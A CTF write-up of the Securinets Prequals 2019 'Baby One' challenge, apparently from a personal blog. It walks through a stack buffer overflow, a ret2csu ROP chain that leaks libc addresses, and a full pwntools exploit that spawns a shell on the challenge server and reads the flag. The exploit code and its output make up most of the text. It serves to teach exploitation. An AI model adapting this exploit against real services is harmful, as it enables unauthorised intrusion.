---
layout:     post
title:      'Securinets Prequals 2019 - Baby One'
date:       2019-03-26 0:00:00
author:     'W3ndige'
permalink: /:title/
category: 'Securinets Prequals 2019'
---

A little bit late but here's my write up for **Securinets Prequals 2019** challenge called **Baby One**. Really cool task with simple stack buffer overflow, but requires some 'universal' exploitation knowledge. Let's take a look at it. 

Firstly, let's analyze it with `radare2`. 

```text
w3ndige@main ~/D/c/s/baby-one> r2 -AAA baby1 
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Enable constraint types analysis for variables
 -- No fix, no sleep
[0x00400500]> afl
0x00400478    3 26           sym._init
0x004004b0    1 6            sym.imp.write
0x004004c0    1 6            sym.imp.read
0x004004d0    1 6            sym.imp.__libc_start_main
0x004004e0    1 6            sym.imp.setvbuf
0x004004f0    1 6            fcn.004004f0
0x00400500    1 41           entry0
0x00400530    4 50   -> 41   sym.deregister_tm_clones
0x00400570    4 58   -> 55   sym.register_tm_clones
0x004005b0    3 28           sym.__do_global_dtors_aux
0x004005d0    4 38   -> 35   entry.init0
0x004005f6    1 96           sym.main
0x00400660    4 101          sym.__libc_csu_init
0x004006d0    1 2            sym.__libc_csu_fini
0x004006d4    1 9            sym._fini
[0x00400500]> pdf @sym.main
            ;-- main:
/ (fcn) sym.main 96
|   int sym.main (int argc, char **argv, char **envp);
|           ; var int var_30h @ rbp-0x30
|           ; DATA XREF from entry0 (0x40051d)
|           0x004005f6      55             push rbp
|           0x004005f7      4889e5         mov rbp, rsp
|           0x004005fa      4883ec30       sub rsp, 0x30               ; '0'
|           0x004005fe      488b05430a20.  mov rax, qword [obj.stdout] ; obj.__TMC_END ; [0x601048:8]=0
|           0x00400605      b900000000     mov ecx, 0
|           0x0040060a      ba02000000     mov edx, 2
|           0x0040060f      be00000000     mov esi, 0
|           0x00400614      4889c7         mov rdi, rax
|           0x00400617      e8c4feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
|           0x0040061c      ba1d000000     mov edx, 0x1d               ; 29
|           0x00400621      bee4064000     mov esi, str.Welcome_to_securinets_Quals ; 0x4006e4 ; "Welcome to securinets Quals!\n"
|           0x00400626      bf01000000     mov edi, 1
|           0x0040062b      b800000000     mov eax, 0
|           0x00400630      e87bfeffff     call sym.imp.write          ; ssize_t write(int fd, void *ptr, size_t nbytes)
|           0x00400635      488d45d0       lea rax, [var_30h]
|           0x00400639      ba2c010000     mov edx, 0x12c              ; 300
|           0x0040063e      4889c6         mov rsi, rax
|           0x00400641      bf00000000     mov edi, 0
|           0x00400646      b800000000     mov eax, 0
|           0x0040064b      e870feffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
|           0x00400650      4831d2         xor rdx, rdx
|           0x00400653      90             nop
|           0x00400654      c9             leave
\           0x00400655      c3             ret
```

In disassembly you can see that the the `read` call tries to read `300` bytes into the buffer of size `0x30`. With additional checks you can see that there's no place for simple shellcoding as `NX` bit is set, so no execution on the stack. 

```text
[0x00400500]> i~nx
nx       true
```

We can check if it's possible to overwrite the place on the stack where `rsp` register points to - which after `ret` instruction will be popped into the `rip` register allowing us to control the execution. 

```text
gdb-peda$ pattern_create 300 input
Writing pattern of 300 chars to filename "input"
gdb-peda$ r < input
Starting program: /home/w3ndige/Development/ctf-solutions/securinets-quals-2019/baby-one/baby1 < input
Welcome to securinets Quals!

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x12c 
RBX: 0x0 
RCX: 0x7ffff7eba775 (<read+21>:	cmp    rax,0xfffffffffffff000)
RDX: 0x0 
RSI: 0x7fffffffe450 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
RDI: 0x0 
RBP: 0x4147414131414162 ('bAA1AAGA')
RSP: 0x7fffffffe488 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"...)
RIP: 0x400655 (<main+95>:	ret)
R8 : 0x7ffff7f8e720 --> 0x0 
R9 : 0x7ffff7f93500 (0x00007ffff7f93500)
R10: 0x7ffff7ff0380 (<strcmp+3200>:	pxor   xmm0,xmm0)
R11: 0x246 
R12: 0x400500 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe560 ("%IA%eA%4A%JA%fA%5A%KA%gA%6A%\377\177")
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400650 <main+90>:	xor    rdx,rdx
   0x400653 <main+93>:	nop
   0x400654 <main+94>:	leave  
=> 0x400655 <main+95>:	ret    
   0x400656:	nop    WORD PTR cs:[rax+rax*1+0x0]
   0x400660 <__libc_csu_init>:	push   r15
   0x400662 <__libc_csu_init+2>:	push   r14
   0x400664 <__libc_csu_init+4>:	mov    r15d,edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe488 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"...)
0008| 0x7fffffffe490 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%"...)
0016| 0x7fffffffe498 ("IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A"...)
0024| 0x7fffffffe4a0 ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4"...)
0032| 0x7fffffffe4a8 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%"...)
0040| 0x7fffffffe4b0 ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA"...)
0048| 0x7fffffffe4b8 ("A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%\377\177")
0056| 0x7fffffffe4c0 ("AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%\377\177")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400655 in main ()
gdb-peda$ pattern_search
Registers contain pattern buffer:
RBP+0 found at offset: 48
Registers point to pattern buffer:
[RSI] --> offset 0 - size ~203
[RSP] --> offset 56 - size ~203
[R13] --> offset 272 - size ~36
Pattern buffer found at:
0x00007fffffffe450 : offset    0 - size  300 ($sp + -0x38 [-14 dwords])
References to pattern buffer found at:
0x00007fffffffe098 : 0x00007fffffffe450 ($sp + -0x3f0 [-252 dwords])
```

Great, that's what we need. Offset `56` will allow us to later control the flow of the execution. Now we need to find, where actually we want to jump. By viewing the gadgets in `ropper` there didn't seem to be any useful gadgets. Also, we do not have any `system` call in the binary to jump into. To be honest, I was stuck for a long time in this section until I've found a possible way to exploit this binary. 

Firstly, we need to have control of `rdx` register. As there is no `pop rdx` gadget, I've decided to use `ret2csu` technique learned from the last [RopEmporium](https://ropemporium.com/) challenge. This way we'll have control of all three registers. 


```text
[0x00400500]> pdf @sym.__libc_csu_init
/ (fcn) sym.__libc_csu_init 101
|   sym.__libc_csu_init (int arg1, int arg2, int arg3);
|           ; arg int arg1 @ rdi
|           ; arg int arg2 @ rsi
|           ; arg int arg3 @ rdx
|           ; DATA XREF from entry0 (0x400516)
|           0x00400660      4157           push r15
|           0x00400662      4156           push r14
|           0x00400664      4189ff         mov r15d, edi               ; arg1
|           0x00400667      4155           push r13
|           0x00400669      4154           push r12
|           0x0040066b      4c8d259e0720.  lea r12, obj.__frame_dummy_init_array_entry ; loc.__init_array_start ; 0x600e10
|           0x00400672      55             push rbp
|           0x00400673      488d2d9e0720.  lea rbp, obj.__do_global_dtors_aux_fini_array_entry ; loc.__init_array_end ; 0x600e18
|           0x0040067a      53             push rbx
|           0x0040067b      4989f6         mov r14, rsi                ; arg2
|           0x0040067e      4989d5         mov r13, rdx                ; arg3
|           0x00400681      4c29e5         sub rbp, r12
|           0x00400684      4883ec08       sub rsp, 8
|           0x00400688      48c1fd03       sar rbp, 3
|           0x0040068c      e8e7fdffff     call sym._init
|           0x00400691      4885ed         test rbp, rbp
|       ,=< 0x00400694      7420           je 0x4006b6
|       |   0x00400696      31db           xor ebx, ebx
|       |   0x00400698      0f1f84000000.  nop dword [rax + rax]
|       |   ; CODE XREF from sym.__libc_csu_init (0x4006b4)
|      .--> 0x004006a0      4c89ea         mov rdx, r13
|      :|   0x004006a3      4c89f6         mov rsi, r14
|      :|   0x004006a6      4489ff         mov edi, r15d
|      :|   0x004006a9      41ff14dc       call qword [r12 + rbx*8]
|      :|   0x004006ad      4883c301       add rbx, 1
|      :|   0x004006b1      4839eb         cmp rbx, rbp
|      `==< 0x004006b4      75ea           jne 0x4006a0
|       |   ; CODE XREF from sym.__libc_csu_init (0x400694)
|       `-> 0x004006b6      4883c408       add rsp, 8
|           0x004006ba      5b             pop rbx
|           0x004006bb      5d             pop rbp
|           0x004006bc      415c           pop r12
|           0x004006be      415d           pop r13
|           0x004006c0      415e           pop r14
|           0x004006c2      415f           pop r15
\           0x004006c4      c3             ret
```

Firstly, we'll jump to the last section of this function, popping values into the coresponding registers.

```text
|           0x004006ba      5b             pop rbx
|           0x004006bb      5d             pop rbp
|           0x004006bc      415c           pop r12
|           0x004006be      415d           pop r13
|           0x004006c0      415e           pop r14
|           0x004006c2      415f           pop r15
\           0x004006c4      c3             ret
```

After `ret` instruction, we'll make another jump slightly higher in this function, that will move values from popped registers into the registers we want to control. 

```text
|      .--> 0x004006a0      4c89ea         mov rdx, r13
|      :|   0x004006a3      4c89f6         mov rsi, r14
|      :|   0x004006a6      4489ff         mov edi, r15d
|      :|   0x004006a9      41ff14dc       call qword [r12 + rbx*8]
|      :|   0x004006ad      4883c301       add rbx, 1
|      :|   0x004006b1      4839eb         cmp rbx, rbp
|      `==< 0x004006b4      75ea           jne 0x4006a0
```

That way, we'll have everything we want in registers `rdx`, `rsi` and `edi`. We also have to remember that `rbx` should be `0` and `rbp` should be `1` to satisfy the comparision at address `0x004006b1`. And of course, we'll have to remeber about the `call` from `0x004006a9`. Once again, we'll jump to `_init` function, so let's find it address in `.dynamic` section. 

```
w3ndige@main ~/D/c/s/baby-one> readelf -S  baby1
There are 31 section headers, starting at offset 0x1a70:
...
  [22] .dynamic          DYNAMIC          0000000000600e28  00000e28
       00000000000001d0  0000000000000010  WA       6     0     8
  [23] .got              PROGBITS         0000000000600ff8  00000ff8
...
```

Address of this section is `0000000000600e28`, so at this place we can look in `gdb` for the address of `_init`. 

```
gdb-peda$ x/20wx 0x00600e28
0x600e28:	0x00000001	0x00000000	0x00000001	0x00000000
0x600e38:	0x0000000c	0x00000000	0x00400478	0x00000000
0x600e48:	0x0000000d	0x00000000	0x004006d4	0x00000000
0x600e58:	0x00000019	0x00000000	0x00600e10	0x00000000
0x600e68:	0x0000001b	0x00000000	0x00000008	0x00000000
```

As the address of `_init` in disassembly is `0x00400478`, we can calculate that it's placed at address `0x600e38 + 0x8`. 

So, we have everything we want to satsfy the `ret2csu` technique. My next step was to leak addresses of `libc`. If we leak address of `read` and `write`, we may be able to identif the version of used `libc`, and finally calculate the `base` address, address of `system` and address of `/bin/sh` string. 

With control of `rdx`, we will be able to call the system('/bin/sh')` and pwn this challenge. 

Firstly, let's start with gathering all the information we've previously gathered into a nice `Python` script.

```python
from pwn import *

baby1 = ELF('./baby1')

main        = baby1.symbols[b'main']
write_plt   = baby1.symbols[b'write']
write_got   = baby1.got[b'write']
read_got    = baby1.got[b'read']

lib_csu_pop     = 0x004006ba
lib_csu_mov     = 0x004006a0

init            = 0x600e38 + 0x8 
```

After that, we may be able to use `ret2csu` technique to leak the address of both `read` and `write`. 

```
def leak_libc(function_address):
    payload = 'A' * 56 

    payload += p64(lib_csu_pop)
    payload += p64(0x00)            # pop rbx
    payload += p64(0x01)            # pop rbp
    payload += p64(init)            # pop r12
    payload += p64(0x08)            # pop r13 (rdx after lib_csu_mov) 
                                    # How many bytes to write.

    payload += p64(function_address)# pop r14 (rsi)
                                    # Here we'll supply address of 
                                    # GOT entries for read and write.

    payload += p64(0x01)            # pop r15 (edi)
                                    # Write to stdout.

    payload += p64(lib_csu_mov)     # Upper part of libc_csu moving
                                    # moves our values into correct registers.
                                    
    payload += p64(0x00)            # add rsp,0x8 padding
    payload += p64(0x00)            # rbx
    payload += p64(0x00)            # rbp
    payload += p64(0x00)            # r12
    payload += p64(0x00)            # r13
    payload += p64(0x00)            # r14
    payload += p64(0x00)            # r15
    payload += p64(write_plt)       # Finally write the leaked address
    payload += p64(main)            # Go to main to repeat the process without
                                    # connecting once again.
    return payload

p = remote('51.254.114.246', 1111)
p.recv(1024)


p.sendline(leak_libc(write_got))

libc_write = u64(p.recv(8))
print("[!] Write lib address libc: " + hex(libc_write))

p.recv(1024)
p.sendline(leak_libc(read_got))
libc_read = u64(p.recv(8))
print("[!] Write lib address libc: " + hex(libc_read))

```

Now we can end the script and get the leaked addresses.

```text
w3ndige@main ~/D/c/s/baby-one> python2 exploit.py
[*] '/home/w3ndige/Development/ctf-solutions/securinets-quals-2019/baby-one/baby1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 51.254.114.246 on port 1111: Done
[!] Write lib address libc: 0x7f7d8e14a2b0
[!] Write lib address libc: 0x7f7d8e14a250
```

Great, we have both addresses leaked. Now we can identify the used `libc` with [this](https://libc.blukat.me/) service. 

![Ghidra View](/img/securinets-prequals/libc-found-offsets.png){:class="img-responsive center-block"}

Both of these versions have the same offsets. Let's use them to prepare the final part of the exploit. 

```python
# Our libc is in version libc6_2.23-0ubuntu10_amd64 

write_offset    = 0x0f72b0 
libc_base       = libc_write - write_offset

system_offset   = 0x045390
system_address  = libc_base + system_offset

sh_address      = libc_base + 0x18cd57 

pop_rdi         = 0x00000000004006c3

# Uncomment for debugging
#pid = util.proc.pidof('baby1')[0]
#print("[*] PID = " + str(pid))
#util.proc.wait_for_debugger(pid)

exploit = "A" * 56

exploit += p64(pop_rdi)
exploit += p64(sh_address)
exploit += p64(system_address)

p.sendline(exploit)
p.interactive()
```

And final exploit can be seen here. 

```python
from pwn import *

baby1 = ELF('./baby1')

main        = baby1.symbols[b'main']
write_plt   = baby1.symbols[b'write']
write_got   = baby1.got[b'write']
read_got    = baby1.got['read']

lib_csu_pop     = 0x004006ba
lib_csu_mov     = 0x004006a0

init            = 0x600e38 + 0x8 

def leak_libc(function_address):
    payload = 'A' * 56 

    payload += p64(lib_csu_pop)
    payload += p64(0x00)            # pop rbx
    payload += p64(0x01)            # pop rbp
    payload += p64(init)            # pop r12
    payload += p64(0x08)            # pop r13 (rdx after lib_csu_mov) 
                                    # How many bytes to write.

    payload += p64(function_address)# pop r14 (rsi)
                                    # Here we'll supply address of 
                                    # GOT entries for read and write.

    payload += p64(0x01)            # pop r15 (edi)
                                    # Write to stdout.

    payload += p64(lib_csu_mov)     # Upper part of libc_csu moves
                                    # our values into correct registers.
                                    
    payload += p64(0x00)            # add rsp,0x8 padding
    payload += p64(0x00)            # rbx
    payload += p64(0x00)            # rbp
    payload += p64(0x00)            # r12
    payload += p64(0x00)            # r13
    payload += p64(0x00)            # r14
    payload += p64(0x00)            # r15
    payload += p64(write_plt)       # Finally write the leaked address
    payload += p64(main)            # Go to main to repeat the process without
                                    # connecting once again.
    return payload

#p = process('./baby1')
p = remote('51.254.114.246', 1111)
p.recv(1024)


p.sendline(leak_libc(write_got))

libc_write = u64(p.recv(8))
print("[!] Write lib address libc: " + hex(libc_write))

p.recv(1024)
p.sendline(leak_libc(read_got))
libc_read = u64(p.recv(8))
print("[!] Write lib address libc: " + hex(libc_read))

# Our libc is in version libc6_2.23-0ubuntu10_amd64 

write_offset    = 0x0f72b0 
libc_base       = libc_write - write_offset

system_offset   = 0x045390
system_address  = libc_base + system_offset

sh_address      = libc_base + 0x18cd57 

pop_rdi         = 0x00000000004006c3

# Uncomment for debugging
#pid = util.proc.pidof('baby1')[0]
#print("[*] PID = " + str(pid))
#util.proc.wait_for_debugger(pid)

exploit = "A" * 56

exploit += p64(pop_rdi)
exploit += p64(sh_address)
exploit += p64(system_address)

p.sendline(exploit)
p.interactive()
```

Now we can pwn it and get the flag. 

```
w3ndige@main ~/D/c/s/baby-one> python2 exploit.py
[*] '/home/w3ndige/Development/ctf-solutions/securinets-quals-2019/baby-one/baby1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 51.254.114.246 on port 1111: Done
[!] Write lib address libc: 0x7f42deb672b0
[!] Write lib address libc: 0x7f42deb67250
[*] Switching to interactive mode
Welcome to securinets Quals!
$ ls 
baby1
flag.txt
main.c
$ cat flag.txt
securinets{controlling_rdx_for_the_win}
```